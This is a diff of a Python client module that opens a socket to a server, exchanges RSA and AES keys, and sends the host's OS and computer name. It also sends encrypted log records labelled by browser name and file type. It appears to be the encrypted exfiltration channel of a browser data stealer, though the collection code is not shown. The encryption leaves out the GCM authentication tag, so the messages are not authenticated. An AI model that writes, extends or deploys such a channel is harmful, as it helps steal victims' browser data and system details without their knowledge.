@@ -8,20 +8,21 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 
-from util.general import FORMAT
+from util.general import FORMAT, BITS_IN_BYTE
 
 
 """ CONSTANTS """
-ADDRESS_HOST = 'localhost'
-ADDRESS_PORT = 4813
+SERVER_HOST = 'localhost'
+SERVER_PORT = 4813
+SERVER_ADDRESS = (SERVER_HOST, SERVER_PORT)
 
-CLIENT_HEADER_LEN = 16
-AES_KEY_SIZE = 128 // 8
-PUBLIC_KEY_LEN = 600
+AES_KEY_SIZE = 128 // BITS_IN_BYTE
+RSA_KEY_LEN_B64 = 600
 
 socket_info = {
-    'client': None,
-    'cipher': None,
+    'server': None,
+    'rsa_cipher': None,
+    'aes_key': b'',
 }
 
 
@@ -44,85 +45,80 @@ def try_socket(socket_function):
 
 @try_socket
 def socket_initialise() -> None:
-    """ Creates socket connection to server """
+    """ Creates socket connection with server """
     # Connect to server
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((ADDRESS_HOST, ADDRESS_PORT))
-    socket_info['client'] = client
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.connect(SERVER_ADDRESS)
+    socket_info['server'] = server
+    print(f'[CONNECTED TO SERVER]: {SERVER_ADDRESS}')
 
-    # Get public key for encryption
-    public_key = client.recv(PUBLIC_KEY_LEN)
+    # Get RSA public key from server
+    print('===== Starting key exchange =====')
+    public_key = server.recv(RSA_KEY_LEN_B64)
     public_key = b64decode(public_key)
+    print('✔️ Received RSA public key from server')
 
     # Create RSA cipher object from public key
     key = RSA.import_key(public_key)
     rsa_cipher = PKCS1_OAEP.new(key)
+    socket_info['rsa_cipher'] = rsa_cipher
 
-    # Generate AES key and nonce
+    # Generate AES key
     aes_key = get_random_bytes(AES_KEY_SIZE)
-    aes_nonce = get_random_bytes(AES_KEY_SIZE)
+    socket_info['aes_key'] = aes_key
 
-    # Generate AES cipher
-    aes_cipher = AES.new(aes_key, AES.MODE_GCM, aes_nonce)
-    socket_info['aes_cipher'] = aes_cipher
+    # Encrypt AES key with RSA cipher and send back to server
+    enc_aes_key = rsa_cipher.encrypt(aes_key)
+    enc_aes_key = b64encode(enc_aes_key)
+    server.send(enc_aes_key)
+    print('✔️ Sent AES key to server')
+    print('===== Key exchange complete =====')
 
-    # Encrypt AES key and nonce with public key
-    socket_send_message({
-        'key': b64encode(aes_key).decode(FORMAT),
-        'nonce': b64encode(aes_nonce).decode(FORMAT),
-    }, rsa_cipher)
-
-    # Send client info to server
+    # Send client info to server using the AES key
     socket_send_message({
         'os': sys.platform,
         'computer': socket.gethostname(),
-    }, aes_cipher)
+    })
 
 
-
-def socket_send_message(data: dict, cipher) -> None:
+def socket_send_message(data: dict) -> None:
     """ Sends data to the socket server """
     # No socket connection
-    client = socket_info['client']
-    if not client:
+    server = socket_info['server']
+    if not server:
         return
 
-    # Encode data
+    # Encode and pad data
     encoded_data = json.dumps(data).encode(FORMAT)
     encoded_data = pad(encoded_data, AES.block_size)
 
-    # Check whether encrypting with AES-GCM will exceed the client header size limit 
-    if cipher == socket_info['aes_cipher']:
-        # Check message length (same before and after encryption)
-        message_length = len(encoded_data)
-        header = str(message_length).encode(FORMAT)
-
-        # Check if header length is allowed by server
-        header_length = len(header)
-        if header_length > CLIENT_HEADER_LEN:
-            raise ValueError('Message length exceeds size limit allowed by server')
+    # Generate new nonce for AES cipher
+    aes_key = socket_info['aes_key']
+    nonce = get_random_bytes(AES_KEY_SIZE)
+    aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce)
 
     # Encrypt data
-    encrypted_data = cipher.encrypt(encoded_data)
-    message_length = len(encrypted_data)
+    ciphertext = aes_cipher.encrypt(encoded_data)
 
-    # Send message length as header
-    header = str(message_length).encode(FORMAT)
-    header_length = len(header)
-    padding = b' ' * (CLIENT_HEADER_LEN - header_length)
-    client.send(header + padding)
+    # Encrypt header with RSA public key and send to server
+    rsa_cipher = socket_info['rsa_cipher']
+    header = json.dumps({
+        'ciphertext_length': len(ciphertext),
+        'nonce': b64encode(nonce).decode(FORMAT),
+    })
+    encrypted_header = rsa_cipher.encrypt(header.encode(FORMAT))
+    server.send(encrypted_header)
 
-    # Send message
-    print(f'Sent {len(encrypted_data)} bytes')
-    client.send(encrypted_data)
+    # Send ciphertext to server
+    print(f'Sent {len(ciphertext)} bytes')
+    server.send(ciphertext)
 
 
 @try_socket
 def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
     """ Send log to socket server """
-    aes_cipher = socket_info['aes_cipher']
     socket_send_message({
         'browser': browser_name,
         'type': file_name,
         'data': data,
-    }, aes_cipher)
+    })
